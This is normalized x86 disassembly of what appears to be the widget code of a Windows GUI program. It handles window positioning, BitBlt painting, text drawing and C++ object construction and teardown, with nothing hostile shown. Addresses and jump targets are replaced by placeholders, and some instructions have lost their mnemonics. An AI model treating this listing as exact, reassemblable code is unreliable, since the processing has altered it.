push eax
push ecx
mov ecx esi
call edx
pop edi
mov [ esi + 0x238 ] 0x0
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ esi + 0x74 ]
mov ecx [ eax + ebx * 4 ]
test ecx ecx
je r-xdata
inc ebx
cmp ebx edi
jl r-xdata
cmp [ ecx + 0x24 ] 0x0
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x68 ]
call eax
sub_42cf10
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
push esi
push edi
mov edi ecx
call sub_417660
cmp [ edi + 0x13c ] 0x0
mov [ esp + 0x14 ] eax
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ edi + 0x29 ] 0x0
je r-xdata
test eax eax
je r-xdata
mov ebx [ edi + 0x78 ]
sub ebx [ edi + 0x74 ]
xor ecx ecx
sar ebx 0x2
mov [ esp + 0x10 ] ecx
test ebx ebx
jle r-xdata
mov eax [ edi + 0x74 ]
mov esi [ eax + ecx * 4 ]
test esi esi
je r-xdata
mov ecx [ esp + 0x10 ]
inc ecx
mov [ esp + 0x10 ] ecx
cmp ecx ebx
jl r-xdata
cmp [ esi + 0x24 ] 0x0
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ esi + 0x68 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x74 ]
mov ecx esi
call eax
test al al
je r-xdata
mov ecx [ edi + 0x1b0 ]
push ecx
lea ecx [ edi + 0x1a4 ]
mov eax esi
call sub_419e90
sub_42cfa0
mov eax [ ecx + 0x44 ]
mov edx [ ecx + 0x40 ]
push esi
mov esi [ ecx + 0x4c ]
push 0x214
sub esi eax
push esi
mov esi [ ecx + 0x48 ]
sub esi edx
push esi
push eax
mov eax [ ecx + 0x1b0 ]
push edx
push 0x0
push eax
call [ SetWindowPos@IAT ]
pop esi
retn
sub_42cfd0
push esi
push edi
mov esi ecx
mov eax [ esi + 0x1b0 ]
lea edi [ esi + 0x30 ]
push edi
push eax
call [ GetClientRect@IAT ]
mov ecx [ edi ]
mov edx [ edi + 0x4 ]
mov eax [ edi + 0x8 ]
mov [ esi + 0x50 ] ecx
mov ecx [ edi + 0xc ]
mov [ esi + 0x54 ] edx
mov [ esi + 0x58 ] eax
pop edi
mov [ esi + 0x5c ] ecx
pop esi
retn
sub_42d000
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
mov esi ecx
mov eax [ esi - 0x70 ]
mov edx [ eax + 0x74 ]
lea ecx [ esi - 0x70 ]
push edi
call edx
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov ecx [ esi - 0x28 ]
mov edx [ esi - 0x24 ]
mov ebx [ esi - 0x30 ]
mov eax [ esi - 0x2c ]
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0xc ] edx
mov edx [ ebp + 0x8 ]
sub ecx edx
add ebx edx
mov edx [ ebp + 0xc ]
add ecx ebx
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp + 0x14 ]
sub ecx edx
push 0xcc0020
add eax edx
mov edx [ esi - 0x24 ]
sub edx [ esi - 0x2c ]
push 0x0
add ecx eax
push 0x0
mov [ ebp - 0xc ] ecx
mov ecx [ esi + 0xf0 ]
push ecx
mov ecx [ esi - 0x28 ]
sub ecx [ esi - 0x30 ]
push edx
mov edx [ ebp + 0x18 ]
push ecx
push eax
push ebx
push edx
mov [ ebp - 0x14 ] eax
call [ BitBlt@IAT ]
mov edi [ esi + 0x8 ]
sub edi [ esi + 0x4 ]
xor eax eax
sar edi 0x2
mov [ ebp - 0x4 ] eax
test edi edi
jle r-xdata
lea ecx [ ecx ]
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x4 ] eax
cmp eax edi
jl r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x74 ]
call eax
test al al
je r-xdata
mov ecx [ esi + 0x4 ]
mov ecx [ ecx + eax * 4 ]
mov [ ebp - 0x8 ] ecx
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ecx ]
mov eax [ edx + 0x58 ]
call eax
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
mov ecx [ ebp + 0x18 ]
mov eax [ eax ]
push ecx
mov ecx [ ebp - 0x14 ]
sub esp 0x10
mov edx esp
mov [ edx ] ebx
mov [ edx + 0x4 ] ecx
mov ecx [ ebp - 0x10 ]
mov [ edx + 0x8 ] ecx
mov ecx [ ebp - 0xc ]
mov [ edx + 0xc ] ecx
mov ecx [ ebp - 0x8 ]
mov edx [ eax + 0x80 ]
call edx
sub_42d140
push ebp
mov ebp esp
push 0xffffffff
push sub_4478ee
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
call sub_4270e0
mov [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea edi [ esi + 0x80 ]
mov ecx rw-data
mov [ ebp - 0x10 ] edi
call edx
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x2
mov [ esi + 0xc ] 0xa
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_42d1d0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_42d200
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_42d200
push ebp
mov ebp esp
push 0xffffffff
push sub_446b49
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
xor ecx ecx
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0x80 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0x4
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_42d2c0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push eax
push ecx
mov ecx esi
call sub_427270
cmp [ esi + 0x25 ] 0x0
jne r-xdata
pop esi
pop ebp
retn 0x8
mov eax [ esi + 0x4 ]
push edi
add eax 0x98
lea edi [ esi + 0x80 ]
call sub_401760
pop edi
sub_42d300
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x64
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x60 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
mov [ esp + 0x10 ] eax
test edi edi
je r-xdata
mov ecx [ esp + 0x6c ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x8
mov edx [ edi ]
mov eax [ edi + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx edi
call edx
mov eax [ edi + 0xc ]
cdq
and edx 0x3
lea ebx [ edx + eax ]
sar ebx 0x2
cmp [ esi + 0x27 ] 0x0
mov [ esp + 0xc ] 0x0
jne r-xdata
mov eax [ esi + 0x6c ]
test al 0x4
jne r-xdata
mov [ esp + 0xc ] 0x3
jmp r-xdata
mov [ esp + 0xc ] 0x2
jmp r-xdata
test al 0x1
je r-xdata
mov ecx [ edi + 0x14 ]
mov eax [ edi ]
mov edx [ eax + 0xc ]
push ecx
mov ecx edi
call edx
mov eax [ edi + 0xc ]
cdq
and edx 0x3
add eax edx
mov edx [ edi + 0x10 ]
sar eax 0x2
mov ecx eax
imul ecx [ esp + 0xc ]
add eax ecx
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] edx
mov eax 0x55555556
imul ebx
mov eax [ esi + 0x30 ]
mov ebx edx
mov [ esp + 0x2c ] eax
shr ebx 0x1f
add ebx edx
mov edx [ esi + 0x34 ]
mov [ esp + 0x30 ] edx
mov edx [ esi + 0x38 ]
add eax ebx
mov [ esp + 0x34 ] edx
mov edx [ esi + 0x3c ]
mov [ esp + 0x34 ] eax
mov [ esp + 0x1c ] 0x0
mov eax [ esp + 0x1c ]
mov [ esp + 0x50 ] eax
mov eax [ esp + 0x24 ]
mov [ esp + 0x38 ] edx
mov edx [ esp + 0x20 ]
mov [ esp + 0x14 ] ecx
mov [ esp + 0x4c ] ecx
add ecx ebx
mov [ esp + 0x58 ] eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x54 ] edx
mov edx [ edi ]
mov edx [ edx + 0x14 ]
mov [ esp + 0x28 ] ecx
mov [ esp + 0x54 ] ecx
movzx ecx [ eax + 0xa9 ]
push ecx
lea eax [ esp + 0x50 ]
push eax
mov eax [ esp + 0x18 ]
lea ecx [ esp + 0x34 ]
push ecx
push eax
mov ecx edi
call edx
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x24 ]
mov [ esp + 0x3c ] eax
mov eax [ esp + 0x20 ]
mov [ esp + 0x44 ] eax
sub eax ebx
mov [ esp + 0x3c ] eax
mov eax [ esi + 0x30 ]
mov [ esp + 0x2c ] eax
mov eax [ esi + 0x38 ]
mov [ esp + 0x40 ] ecx
mov ecx [ esi + 0x34 ]
mov [ esp + 0x34 ] eax
mov [ esp + 0x48 ] edx
mov edx [ esi + 0x3c ]
mov [ esp + 0x30 ] ecx
mov ecx [ esi + 0x4 ]
sub eax ebx
mov [ esp + 0x2c ] eax
mov eax [ edi ]
mov [ esp + 0x38 ] edx
movzx edx [ ecx + 0xa9 ]
push edx
lea ecx [ esp + 0x40 ]
push ecx
mov ecx [ esp + 0x18 ]
lea edx [ esp + 0x34 ]
push edx
mov edx [ eax + 0x14 ]
push ecx
mov ecx edi
call edx
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x24 ]
mov [ esp + 0x5c ] eax
mov eax [ esp + 0x20 ]
mov [ esp + 0x60 ] ecx
mov ecx [ esp + 0x28 ]
mov [ esp + 0x5c ] ecx
mov ecx [ esi + 0x38 ]
sub eax ebx
mov [ esp + 0x68 ] edx
mov edx [ esi + 0x34 ]
mov [ esp + 0x64 ] eax
mov eax [ esi + 0x30 ]
sub ecx ebx
mov [ esp + 0x30 ] edx
mov edx [ esi + 0x3c ]
add eax ebx
mov ebx [ esp + 0x10 ]
mov [ esp + 0x34 ] ecx
mov ecx [ esi + 0x4 ]
mov [ esp + 0x2c ] eax
mov eax [ edi ]
mov eax [ eax + 0x18 ]
mov [ esp + 0x38 ] edx
movzx edx [ ecx + 0xa9 ]
push edx
lea ecx [ esp + 0x60 ]
push ecx
lea edx [ esp + 0x34 ]
push edx
push ebx
mov ecx edi
call eax
mov eax [ esp + 0xc ]
mov edx [ esi ]
mov edx [ edx + 0x9c ]
push eax
push ebx
mov ecx esi
call edx
test al 0x2
je r-xdata
mov [ esp + 0xc ] 0x1
sub_42d530
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov ecx [ esi + 0x80 ]
cmp [ ecx - 0xc ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_443fba
mov esp ebp
pop ebp
retn 0x8
test [ esi + 0x6c ] 0x1
mov edx [ eax + 0x8 ]
mov ecx [ esi + 0x4 ]
mov eax [ ecx + 0x80 ]
push ebx
push edi
mov edi [ edx ]
je r-xdata
cmp [ esi + 0x27 ] 0x0
jne r-xdata
mov eax [ ecx + 0x84 ]
push eax
push edi
call [ SetTextColor@IAT ]
mov [ ebp - 0x1c ] eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
jne r-xdata
mov eax [ ecx + 0x8c ]
mov ebx [ SelectObject@IAT ]
push eax
push edi
call ebx
cmp [ ebp + 0xc ] 0x2
mov ecx [ esi + 0x30 ]
mov edx [ esi + 0x34 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0x38 ]
mov [ ebp - 0x14 ] ecx
mov ecx [ esi + 0x3c ]
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jne r-xdata
mov eax [ rw-data ]
mov ecx [ esi + 0x80 ]
push 0x25
lea eax [ ebp - 0x14 ]
push eax
push 0xffffffff
push ecx
push edi
call [ DrawTextW@IAT ]
mov edx [ ebp - 0x1c ]
push edx
push edi
call [ SetTextColor@IAT ]
mov eax [ ebp - 0x18 ]
push eax
push edi
call ebx
pop edi
pop ebx
push 0x1
push 0x1
lea edx [ ebp - 0x14 ]
push edx
call [ OffsetRect@IAT ]
sub_42d620
push ebp
mov ebp esp
push 0xffffffff
push sub_446ae8
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
call sub_4270e0
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x80 ] eax
mov [ esi + 0x84 ] eax
mov [ esi + 0x88 ] eax
mov [ esi + 0x8c ] eax
mov [ esi + 0x90 ] eax
mov [ esi + 0x94 ] eax
mov [ esi + 0x98 ] eax
mov [ esi + 0x9c ] eax
mov [ esi + 0xc ] 0xb
mov [ esi + 0xa0 ] al
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_42d6c0
push ebp
mov ebp esp
push 0xffffffff
push sub_446ac3
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
or eax 0xffffffff
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0x2
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] eax
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_42d760
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov [ ecx + 0x40 ] edx
mov edx [ eax + 0x4 ]
mov [ ecx + 0x44 ] edx
mov edx [ eax + 0x8 ]
mov [ ecx + 0x48 ] edx
mov edx [ eax + 0xc ]
mov [ ecx + 0x4c ] edx
mov edx [ eax ]
mov [ ecx + 0x30 ] edx
mov edx [ eax + 0x4 ]
mov [ ecx + 0x34 ] edx
mov edx [ eax + 0x8 ]
mov [ ecx + 0x38 ] edx
mov edx [ eax + 0xc ]
mov [ ecx + 0x3c ] edx
mov edx [ eax ]
mov [ ecx + 0x50 ] edx
mov edx [ eax + 0x4 ]
mov [ ecx + 0x54 ] edx
mov edx [ eax + 0x8 ]
mov [ ecx + 0x58 ] edx
mov eax [ eax + 0xc ]
mov edx [ ecx + 0x30 ]
mov [ ecx + 0x80 ] edx
mov edx [ ecx + 0x34 ]
mov [ ecx + 0x84 ] edx
mov edx [ ecx + 0x38 ]
mov [ ecx + 0x88 ] edx
mov edx [ ecx + 0x3c ]
mov [ ecx + 0x8c ] edx
mov [ ecx + 0x5c ] eax
mov eax [ ecx + 0x4 ]
mov edx [ eax + 0xc4 ]
add edx [ ecx + 0x80 ]
mov [ ecx + 0x88 ] edx
mov edx [ ecx + 0x30 ]
mov [ ecx + 0x90 ] edx
mov edx [ ecx + 0x34 ]
mov [ ecx + 0x94 ] edx
mov edx [ ecx + 0x38 ]
mov [ ecx + 0x98 ] edx
mov edx [ ecx + 0x3c ]
mov [ ecx + 0x9c ] edx
mov edx [ ecx + 0x98 ]
sub edx [ eax + 0xc8 ]
mov [ ecx + 0x90 ] edx
pop ebp
retn 0x4
sub_42d820
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
test edi edi
je r-xdata
pop edi
pop esi
pop ebp
retn 0x8
test [ esi + 0x6c ] 0x4
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x9c ]
push ebx
mov ebx [ ebp + 0x8 ]
push edi
push ebx
call eax
mov edx [ esi ]
mov eax [ edx + 0xa0 ]
push edi
push ebx
mov ecx esi
call eax
pop ebx
mov eax [ ebp + 0x8 ]
push edi
push eax
call sub_427410
pop edi
pop esi
pop ebp
retn 0x8
sub_42d870
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x2c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x28 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi ecx
mov ecx [ esi + 0x38 ]
sub ecx [ esi + 0x30 ]
xor ebx ebx
mov [ esp + 0xc ] eax
xor eax eax
push edi
mov edi [ ebp + 0xc ]
mov [ esp + 0x30 ] ebx
cmp [ esi + 0x27 ] bl
jne r-xdata
mov edx [ esi + 0x6c ]
test dl 0x4
je r-xdata
lea eax [ ebx + 0x3 ]
jmp r-xdata
test dl 0x1
je r-xdata
xor eax eax
cmp [ esi + 0xa0 ] bl
setne al
inc eax
jmp r-xdata
mov edx [ edi ]
imul eax ecx
mov edx [ edx + 0xc ]
mov [ esp + 0x24 ] eax
add eax ecx
mov [ esp + 0x2c ] eax
mov eax [ edi + 0x14 ]
push eax
mov ecx edi
mov [ esp + 0x2c ] ebx
call edx
mov eax [ edi + 0x10 ]
mov edx [ esi + 0x80 ]
mov [ esp + 0x30 ] eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x14 ] ebx
mov [ esp + 0x18 ] ebx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20 ] ebx
mov ecx [ eax + 0xc8 ]
sub [ esp + 0x2c ] ecx
mov ecx [ esi + 0x84 ]
mov [ esp + 0x18 ] ecx
mov ecx [ esi + 0x8c ]
mov [ esp + 0x14 ] edx
mov edx [ esi + 0x88 ]
mov [ esp + 0x20 ] ecx
mov [ esp + 0x1c ] edx
movzx eax [ eax + 0xa9 ]
mov edx [ edi ]
mov edx [ edx + 0x14 ]
push eax
lea ecx [ esp + 0x28 ]
push ecx
mov ecx [ esp + 0x18 ]
lea eax [ esp + 0x1c ]
push eax
push ecx
mov ecx edi
call edx
mov ecx [ esp + 0x34 ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x8
test dl 0x2
je r-xdata
mov eax 0x2
jmp r-xdata
mov eax 0x1
sub_42d980
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x2c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x28 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi ecx
mov ecx [ esi + 0x38 ]
sub ecx [ esi + 0x30 ]
xor ebx ebx
mov [ esp + 0xc ] eax
xor eax eax
push edi
mov edi [ ebp + 0xc ]
mov [ esp + 0x30 ] ebx
cmp [ esi + 0x27 ] bl
jne r-xdata
mov edx [ esi + 0x6c ]
test dl 0x4
jne r-xdata
lea eax [ ebx + 0x3 ]
jmp r-xdata
mov eax 0x2
jmp r-xdata
test dl 0x1
je r-xdata
mov edx [ edi ]
imul eax ecx
mov edx [ edx + 0xc ]
mov [ esp + 0x24 ] eax
add eax ecx
mov [ esp + 0x2c ] eax
mov eax [ edi + 0x14 ]
push eax
mov ecx edi
mov [ esp + 0x2c ] ebx
call edx
mov eax [ edi + 0x10 ]
mov edx [ esi + 0x90 ]
mov [ esp + 0x30 ] eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x14 ] ebx
mov [ esp + 0x18 ] ebx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20 ] ebx
mov ecx [ eax + 0xc4 ]
add [ esp + 0x24 ] ecx
mov ecx [ esi + 0x94 ]
mov [ esp + 0x18 ] ecx
mov ecx [ esi + 0x9c ]
mov [ esp + 0x14 ] edx
mov edx [ esi + 0x98 ]
mov [ esp + 0x20 ] ecx
mov [ esp + 0x1c ] edx
movzx eax [ eax + 0xa9 ]
mov edx [ edi ]
mov edx [ edx + 0x14 ]
push eax
lea ecx [ esp + 0x28 ]
push ecx
mov ecx [ esp + 0x18 ]
lea eax [ esp + 0x1c ]
push eax
push ecx
mov ecx edi
call edx
mov ecx [ esp + 0x34 ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x8
test dl 0x2
je r-xdata
mov eax 0x1
sub_42da80
push ebp
mov ebp esp
mov eax ecx
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebp
retn 0x4
xor edx edx
cmp [ eax + 0xa0 ] dl
jne r-xdata
mov ecx [ eax + 0x1c ]
push esi
mov esi [ ecx ]
push edx
mov edx [ eax + 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ ebp + 0x8 ]
push edx
push eax
mov eax [ esi + 0x10 ]
call eax
pop esi
mov edx 0x1
sub_42dac0
push ebp
mov ebp esp
and esp 0xfffffff8
push esi
push edi
mov edi [ ebp + 0x14 ]
mov esi ecx
mov ecx edi
shr ecx 0x10
movsx ecx cx
movsx eax di
push ecx
push eax
lea edx [ esi + 0x80 ]
push edx
call [ PtInRect@IAT ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0x8 ]
test eax eax
setne al
push edi
mov [ esi + 0xa0 ] al
mov eax [ ebp + 0xc ]
push edx
push eax
push ecx
mov ecx esi
call sub_427990
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_42db30
push ebp
mov ebp esp
push 0xffffffff
push sub_446ae8
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
call sub_4270e0
mov [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0xc ] 0xc
mov [ esi + 0x80 ] 0x3
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_42dba0
push ebp
mov ebp esp
push 0xffffffff
push sub_446ac3
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
or eax 0xffffffff
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0x2
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] eax
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_42dc40
push ebp
mov ebp esp
sub esp 0x8
push edi
mov edi ecx
cmp [ edi + 0x24 ] 0x0
je r-xdata
pop edi
mov esp ebp
pop ebp
retn 0xc
cmp [ edi + 0x25 ] 0x0
je r-xdata
cmp [ edi + 0x26 ] 0x0
je r-xdata
mov eax [ edi + 0x80 ]
push ebx
push esi
cmp eax 0x4
ja r-xdata
mov esi [ edi + 0x4 ]
lea ecx [ esi + 0xb0 ]
lea ebx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] 0x0
call sub_414260
mov eax [ ebp - 0x8 ]
cmp eax [ esi + 0xb4 ]
je r-xdata
jmp [ eax * 4 + jump_table_42dd40 ]
xor eax eax
mov eax [ eax + 0x10 ]
jmp r-xdata
mov esi [ edi + 0x4 ]
mov eax 0x5
call sub_413ad0
jmp r-xdata
mov esi [ edi + 0x4 ]
xor eax eax
call sub_413ad0
jmp r-xdata
mov esi [ edi + 0x4 ]
mov eax 0x4
call sub_413ad0
jmp r-xdata
mov esi [ edi + 0x4 ]
mov eax 0x3
call sub_413ad0
jmp r-xdata
mov esi [ edi + 0x4 ]
mov eax 0x2
call sub_413ad0
jmp r-xdata
mov edx [ edi ]
mov edx [ edx + 0x94 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
call edx
pop esi
pop ebx
cmp [ edi + 0x74 ] 0x0
je r-xdata
cmp [ edi + 0x75 ] 0x0
je r-xdata
lea ecx [ esi + 0xb0 ]
lea ebx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] 0x1
call sub_414260
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0xb4 ]
je r-xdata
xor eax eax
mov eax [ eax + 0x10 ]
jmp r-xdata
sub_42dd60
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
mov eax ecx
mov ecx [ ebp + 0x8 ]
je r-xdata
mov [ eax + 0x80 ] ecx
test ecx ecx
jne r-xdata
pop ebp
retn 0x8
cmp [ eax + 0x24 ] 0x0
je r-xdata
jle r-xdata
mov [ eax + 0x80 ] ecx
jmp r-xdata
cmp [ eax + 0x25 ] 0x0
je r-xdata
cmp ecx 0x1e
jl r-xdata
cmp ecx 0x1e
jge r-xdata
cmp [ eax + 0x29 ] 0x0
je r-xdata
cmp [ eax + 0x26 ] 0x0
je r-xdata
cmp ecx 0x50
jl r-xdata
cmp ecx 0x50
jge r-xdata
mov [ eax + 0x80 ] 0x1
jmp r-xdata
mov ecx [ eax + 0x1c ]
test ecx ecx
je r-xdata
cmp ecx 0x64
jle r-xdata
cmp ecx 0x64
jg r-xdata
mov [ eax + 0x80 ] 0x2
jmp r-xdata
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov [ eax + 0x80 ] 0x4
jmp r-xdata
mov [ eax + 0x80 ] 0x3
jmp r-xdata
cmp [ edx + 0xab ] 0x0
push esi
mov esi [ ecx ]
sete dl
movzx edx dl
push 0x0
push edx
push eax
mov eax [ esi + 0x20 ]
call eax
pop esi
sub_42de30
push ebp
mov ebp esp
push 0xffffffff
push sub_446ae8
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
call sub_4270e0
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0xc ] 0xd
mov [ esi + 0x80 ] eax
mov [ esi + 0x88 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_42dea0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_42ded0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_42ded0
push ebp
mov ebp esp
push 0xffffffff
push sub_446a83
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x80 ]
mov edi [ DeleteObject@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x84 ]
test eax eax
je r-xdata
push eax
call edi
mov [ esi + 0x80 ] 0x0
or eax 0xffffffff
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0x2
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
